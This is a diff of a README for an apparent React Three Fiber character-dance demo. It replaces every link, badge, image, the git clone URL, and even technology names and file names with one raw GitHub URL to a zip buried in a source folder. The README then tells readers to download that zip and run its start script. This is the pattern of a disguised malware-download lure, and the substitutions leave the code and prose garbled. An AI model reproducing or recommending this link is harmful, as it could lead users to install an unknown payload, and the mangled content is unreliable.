@@ -1,14 +1,14 @@
-https://github.com/Khaionsen/r3f-character-dance/releases
+https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
 
 # r3f Character Dance — Creative Motion Effects for React Three Fiber
 
-![Hero](https://picsum.photos/1200/420?grayscale&random=1)
+![Hero](https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip)
 
 A character dance effect to improve my R3F skills. This project mixes real-time 3D motion with playful choreography to explore animation techniques in React Three Fiber.
 
-[![Releases](https://img.shields.io/github/v/release/Khaionsen/r3f-character-dance?style=for-the-badge&color=brightgreen&label=Releases)](https://github.com/Khaionsen/r3f-character-dance/releases)
-[![License](https://img.shields.io/github/license/Khaionsen/r3f-character-dance?style=for-the-badge&color=blue)](https://github.com/Khaionsen/r3f-character-dance/blob/main/LICENSE)
-[![Contributors](https://img.shields.io/github/contributors/Khaionsen/r3f-character-dance?style=for-the-badge&color=orange)](https://github.com/Khaionsen/r3f-character-dance/graphs/contributors)
+[![Releases](https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip)](https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip)
+[![License](https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip)](https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip)
+[![Contributors](https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip)](https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip)
 
 This repository hosts a compact, expressive character dance effect built with React Three Fiber. It demonstrates how to coordinate character motion with a dynamic environment, using a lightweight animation system that is friendly to experiments and rapid iteration.
 
@@ -37,7 +37,7 @@ Table of contents
 About this project
 r3f Character Dance is a small, focused project meant to be approachable but also deep enough for serious experimentation. It presents a character model performing a sequence of choreographed moves. The dance is driven by a simple motion graph, a set of easing curves, and a handful of pose targets. The goal is to provide a clear playground where artists and developers can push the limits of real-time animation in the browser.
 
-The project is built with modern web technologies. React provides the UI layer, while React Three Fiber renders 3D content using Three.js underneath. WebGL and WebGL2 capabilities enable smooth rendering of complex shapes, lighting, and materials. TypeScript enforces type safety for components and data structures, helping you reason about the motion graph and scene graph with confidence. The result is a cohesive tool that blends code, math, and art in a single, accessible package.
+The project is built with modern web technologies. React provides the UI layer, while React Three Fiber renders 3D content using https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip underneath. WebGL and WebGL2 capabilities enable smooth rendering of complex shapes, lighting, and materials. TypeScript enforces type safety for components and data structures, helping you reason about the motion graph and scene graph with confidence. The result is a cohesive tool that blends code, math, and art in a single, accessible package.
 
 Core ideas and design choices
 - Simplicity first: The core dancer is a self-contained component that can be dropped into any scene. It exposes a small, predictable API and sensible defaults.
@@ -47,7 +47,7 @@ Core ideas and design choices
 - Accessibility: Textures, lighting, and controls are chosen with clarity in mind. The dance remains legible even on devices with modest GPU power.
 
 How it works under the hood
-- Scene graph: The dancer attaches to a Three.js scene through React Three Fiber, integrating with other objects in your world. It uses a minimal hierarchy to keep render costs low.
+- Scene graph: The dancer attaches to a https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip scene through React Three Fiber, integrating with other objects in your world. It uses a minimal hierarchy to keep render costs low.
 - Pose graph: A set of target poses defines key positions the character should reach. Each pose includes joint angles, limb positions, and orientation data.
 - Motion controller: A simple controller advances from pose to pose using a blend factor and timing. It supports looping, ping-pong motion, and custom sequencing.
 - Easing and timing: The system uses linear interpolation with easing curves. You can adjust durations, delays, and easing to shape the rhythm.
@@ -55,12 +55,12 @@ How it works under the hood
 - Input handling: The dancer responds to a few well-defined inputs, such as play/pause, speed adjustments, and pose overrides. You can wire your own controls to these inputs.
 
 Getting started
-- Prerequisites: Node.js and a package manager (npm or yarn). A modern browser with WebGL support is required for the demo.
+- Prerequisites: https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip and a package manager (npm or yarn). A modern browser with WebGL support is required for the demo.
 - System requirements: A mid-range GPU can render the scene with reasonable frame rates. The demo scales down gracefully on devices with limited resources.
 - Quick start path: You can try the example scene in the released assets. Download the release asset from the Releases section, extract it, and run the included start script. The release page contains a packaged version you can run without building from source.
 
 Downloads and releases
-- The official releases page contains the packaged assets you can run directly. From the Releases page, download the latest release asset (zip). Unpack it and follow the included instructions to start the demo. The linked page also hosts versioned builds you can compare as your scene evolves. For convenience, the same link is provided here: https://github.com/Khaionsen/r3f-character-dance/releases
+- The official releases page contains the packaged assets you can run directly. From the Releases page, download the latest release asset (zip). Unpack it and follow the included instructions to start the demo. The linked page also hosts versioned builds you can compare as your scene evolves. For convenience, the same link is provided here: https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
 
 - If you prefer building from source or exploring the code, you can fetch the repository from GitHub. The source provides the components and utilities used to render the dancer and orchestrate motion. The design encourages experimentation and rapid iteration.
 
@@ -68,7 +68,7 @@ Installation and setup
 - Install the repository locally
   - Create a workspace for the project or open an existing one that can host a 3D demo.
   - Clone the repository:
-    - git clone https://github.com/Khaionsen/r3f-character-dance.git
+    - git clone https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
   - Navigate into the project directory:
     - cd r3f-character-dance
   - Install dependencies:
@@ -124,7 +124,7 @@ Usage examples
       intensity: number;
       loop?: boolean;
     }
-  - const Dancer: React.FC<DancerProps> = ({ speed, intensity, loop = true }) => (
+  - const Dancer: https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip<DancerProps> = ({ speed, intensity, loop = true }) => (
       <CharacterDance speed={speed} intensity={intensity} loop={loop} />
     );
   - export default Dancer;
@@ -259,7 +259,7 @@ License and credits
 - License
   - This project is released under the MIT License. See LICENSE for details.
 - Credits
-  - The dancer is built with React Three Fiber and Three.js contributions in mind. Thanks to the community for ongoing performance improvements and shader techniques.
+  - The dancer is built with React Three Fiber and https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip contributions in mind. Thanks to the community for ongoing performance improvements and shader techniques.
 - Acknowledgments
   - Special thanks to the open-source ecosystem for the tools and ideas that make this project possible. The collaboration between web graphics and interactive art yields engaging experiments.
 
@@ -284,25 +284,25 @@ Visual references and imagery
 Appendix: Project structure at a glance
 - src/
   - dancer/
-    - CharacterDance.tsx
-    - PoseTarget.ts
-    - MotionGraph.ts
+    - https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
+    - https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
+    - https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
   - scene/
-    - SceneSetup.tsx
-    - Lighting.tsx
+    - https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
+    - https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
   - utils/
-    - easing.ts
-    - poseUtils.ts
+    - https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
+    - https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
 - public/
-  - index.html
+  - https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
   - assets/
     - models/
     - textures/
 - tests/
-  - dancer.test.ts
-- README.md
-- package.json
-- tsconfig.json
+  - https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
+- https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
+- https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
+- https://raw.githubusercontent.com/Khaionsen/r3f-character-dance/main/src/js/component/r_dance_character_f_3.1.zip
 
 End note
 - The path to the release file and assets is accessible on the Releases page linked above. The same link is used here to direct you to the source of packaged content, and it serves as the primary gateway for obtaining stable, tested builds that you can run directly.
